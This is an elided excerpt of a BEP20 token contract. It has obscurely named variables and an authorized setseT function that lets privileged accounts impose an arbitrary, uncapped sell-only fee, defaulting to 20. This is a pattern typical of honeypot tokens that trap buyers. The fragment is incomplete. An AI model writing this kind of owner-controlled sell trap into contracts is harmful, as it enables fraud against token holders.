...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 SINU = IBEP20(0x5Efe9c3e5b43580328104Da18A091cE6a3D40651);
...
contract Test is IBEP20, Auth {
    ...
    bool public seT = true;
    uint256 public seTt = 20;
    bool bFrz = true;
    ...
    function getTF(bool selling) public view returns (uint256) {
        ...
        if(selling && seT){ return seTt.mul(1); }
        return totF;
    }
    ...
    function setseT(bool _status, uint256 _seTt) external authorized {
        seT = _status;
        seTt = _seTt;
    }
